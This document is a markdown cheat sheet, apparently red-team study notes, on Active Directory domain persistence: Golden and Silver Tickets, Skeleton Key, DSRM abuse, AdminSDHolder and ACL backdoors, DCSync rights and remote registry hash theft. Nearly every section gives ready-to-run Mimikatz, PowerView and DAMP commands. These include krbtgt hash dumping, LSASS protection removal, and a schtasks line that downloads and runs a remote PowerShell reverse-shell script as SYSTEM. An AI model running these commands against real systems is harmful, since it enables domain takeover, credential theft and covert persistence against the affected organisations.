# Domain Persistence
---
>**Important:**
>[Synchronizing time is important](Kerberoas%2523Synchronizing%2520time%2520is%2520important)
---
## Golden Ticket
## Definition
A valid **TGT as any user** can be created **using the NTLM hash of the krbtgt AD account**. The advantage of forging a TGT instead of TGS is being **able to access any service** (or machine) in the domain and the impersonated user.
The **krbtgt** account **NTLM hash** can be **obtained** from the **lsass process** or from the **NTDS.dit file** of any DC in the domain.
## Attack
1. Dumping hashes (Requires DA privilege)
```powershell
#On DC (Nishang module)
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'

#Using DcSync (Quiter)
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'
```
2. Generating the ticket
```powershell
#On any machine (Nishang module)
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN-FQDN> /sid:<Domain-SID> /krbtgt:<NTLM> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```
>Note: `/ptt` injects the ticket in the current powershell process (no need to save  the ticket on disk).Alternatively you can use `/ticket` to save the  ticket in a file for later use.

3. Confirm by running `klist` to view cached tickets in memory
```powrshell
klist
```
**Once** you have the **golden Ticket injected**, you can access the shared files **(C$)**, and execute services and WMI, so you could use **psexec** or **wmiexec** to obtain a shell (looks like yo can not get a shell via winrm).

## Further reading
- Explained -> [**Golden-tickets**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- Cheatsheet -> [**Hacktricks**](https://book.hacktricks.xyz/windows/active-directory-methodology/golden-ticket)
--- 
## Silver Ticket
## Definition
The Silver ticket attack is based on **crafting a valid TGS for a service once the NTLM hash of service is owned** (like the **PC account hash**). Thus, it is possible to **gain access to that service** by forging a custom TGS **as any user**.
## Attack
1. Dumping hashes (Requires DA privilege)
```powershell
#On DC (Nishang module)
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'

#Using DcSync (Quiter)
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'
```
2. Forging the ticket
```powershell
#(Nishang module)
Invoke-Mimikatz -Command '"kerberos::golden /domain:<Domain-FQDN> /sid:<Domain-SID> /rc4:<Service-NTLM> /user:Administrator /service:<SPN> /target:<Target-Computer> /ptt"'
```
> Note:
> `/Service`: is the SPN name of service for which TGS is to be created.
  `/Target`: server hosting the attacked service for which the TGS ticket was cracked.
 
## Getting a reverse shell.

**HOST**  service
```powershell
#Forging TGS (Nishang module)
Invoke-Mimikatz -Command '"kerberos::golden /domain:<Domain-FQDN> /sid:<Domain-SID> /rc4:<Service-NTLM> /user:Administrator /service:HOST /target:<Target-Computer> /ptt"'
#Scheduling task in remote computers
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
> Useful tool: [**Powercat**](https://github.com/besimorhino/powercat)

## Further reading
- Cheatsheet -> [**Hacktricks**](https://book.hacktricks.xyz/windows/active-directory-methodology/silver-ticket)
- Explained -> [**Silver-tickets**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)

## Skeleton key
The Skeleton Key is a particularly scary piece of malware targeted at Active Directory domains to make it alarmingly easy to hijack any account. This malware injects itself into **LSASS** and creates a master password that will work for any account in the domain. Existing passwords will also continue to work, so it is very difficult to know this attack has taken place unless you know what to look for.
## Attack
Requires DA privileges
```powershell 
#(Nishang module)
Invoke-Mimikatz -Command '"misc::skeleton"'

## Now you can authenticate as any user with the default password of --> Mimikatz
```
In case lssas is running as a protected process we can still use skeleton key but it needs the mimikatz driver (mimideiv.sys) on disk of the target.
```powershell
mimikatz
privilege::debug
!+
!processprotect /process:lssas.exe /remove
misc::skeleton
!-

#Very Noisy in logs
```
 > **Note:** Rebooting a domain controller will remove this malware and it will have to be redeployed by the attacker.

## DSRM
There is a **local administrator** account inside each **DC**. Having admin privileges in this machine you can use mimikatz to **dump the local Administrator hash**. Then, modifying a registry to **activate this password** so you can remotely access to this local Administrator user.
## Attack
1. Dump the hash of local administrator.
```powershell
#(Nishang module)
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```
2. Then we need to check if that account will work, and if the registry key has the value "0" or it doesn't exist you need to **set it to "2"**.
```powershell
#Check if the key exists and get the value
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior
#Create key with value "2" if it doesn't exist
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD
#Change value to "2"
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2
```
Then, using a PTH you can **list the content of C$ or even obtain a shell**. Notice that for creating a new powershell session with that hash in memory (for the PTH) **the "domain" used is just the name of the DC machine:**
```powershell
#(Nishang module)
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<DC-Host-Name> /user:Administrator /ntlm:<NTLM> /run:powershell.exe'"
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
## ACLS
## Definition
An ACL is a set of rules that define which entities have which permissions on a specific AD object. These objects can be user accounts, groups, computer accounts, the domain itself and many more. The ACL can be configured on an individual object such as a user account, but can also be configured on an Organizational Unit (OU), which is like a directory within AD.
### Well known abused protected groups:
- **Account Operators:** Can modify AD/EA/BA groups,and modify nested group within these groups.
- **Backup Operators:** Backup GPO,edit to add SID of controlled account to privileged group and restore.
- **Server Operators:** Run command as system using *Disabled browser service*
- **Print Operators:** Copy `ntds.dit` backup,load device drivers
### Some of the Active Directory object permissions and types that we as attackers are interested in:
-   **GenericAll** - full rights to the object (add users to a group or reset user's password)
-   **GenericWrite** - update object's attributes (i.e logon script)
-   **WriteOwner** - change object owner to attacker controlled user take over the object
-   **WriteDACL** - modify object's ACEs and give attacker full control right over the object
-   **AllExtendedRights** - ability to add user to a group or reset password    
-   **ForceChangePassword** - ability to change user's password
-   **Self (Self-Membership)** - ability to add yourself to a group
## Attacks
## AdminSDHolder
1. Add `FullControl` permissions for a user to the AdminSDHolder. (Requires DA Privileges).
```powershell
#Powerview module
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName abuqasem -Rights All -Verbose
```
2. Check `Domain Admins` permission.
```powershell
#Powerview module
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDS | ?{$_.IdentityReference -match 'abuqasem'}
```
3. Abusing `FullControl`
```powershell
#Powerview module
Add-DomainGroupMember -Identity 'Domain Admins' -Members redgroup -Verbose

#ActiveDirectory module
Add-ADGroupMember -Identity 'Domain Admins' -Members redgroup
```
1. Add `ResetPassword` and `WriteMembers` for a user to the AdminSDHolder.
```powershell
#Powerview module
#ResetPassword
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName abuqasem -Rights ResetPassword -Verbose
#WriteMembers
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName abuqasem -Rights WriteMembers -Verbose
```
2. Abusing `ResetPassword`
```powershell
#Powerview module
Set-DomainUserPassword -Identity redgroup -AccountPassword (ConvertTo-SecureString "Abuqasem@123" -AsPlainText -Force) -Force
```
## Rights Abuse
With DA privileges,the ACL for the domain root can be modified to provide useful rights like `FullControl` or the ability to run `DCSync`
1. Add rights for `DCSync`
```powershell
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=monrycorp,DC=local' -Principal abuqasem -Rights DCSync -Verbose
```
2. Get `krbtgt` hash
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp/krbtgt"'
```
## Security Descriptors
**ACLs can be modified to allow non-admin users  access to securable objects.**
- On local machine for the user.
```powershell
#Nishang module
Set-RemoteWMI -UserName abuqasem -Verbose
```
- On remote machine for the user without credentials.
```powershell
#Nishang module
Set-RemoteWMI -UserName abuqasem -ComputerName corp-dc -NameSpace 'root\cimv2' -Verbose
```
- On remote machine for the user with credentials (only root\\cimv2 and nested namespaces).
```powershell
#Nishang module
Set-RemoteWMI -UserName abuqasem -ComputerName corp-dc -Credential Administrator -NameSpace 'root\cimv2' -Verbose
```
- On remote machine remove permissions.
```powershell
#Nishang module
Set-RemoteWMI -UserName abuqasem -ComputerName corp-dc -NameSpace 'root\cimv2' -Remove -Verbose
```
### Remote registry
1. Using **DAMP** with admin privileges on remote machine.
```powershell
#DAMP module
Add-RemoteRegBackdoor -ComputerName corp-dc -Trustee abuqasem -Verbose
```
2. As `abuqasem`, retrieve machine account hash.
```powershell
#DAMP module
Get-RemoteMachineAccountHash -ComputerName corp-dc -Verbose
```
3. Retrieve local account hash.
```powershell
#DAMP module
Get-RemoteLocalHash -ComputerName corp-dc -Verbose
```
4. Retrieve domain cached credentials.
```powershell
#DAMP module
Get-RemoteCachedCredetials -ComputerName corp-dc -Verbose
```
---
## Tools
- [Powersploit](https://github.com/PowerShellMafia/PowerSploit)
- ACL Modification -> [DAMP](https://github.com/HarmJ0y/DAMP/)
- Misconfigured ACL pwner [aclpwn](https://github.com/fox-it/aclpwn.py)
## Further reading
- Cheatsheet -> [Hacktricks](https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse)
- Explained ->  [blog.ifox-it](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
---
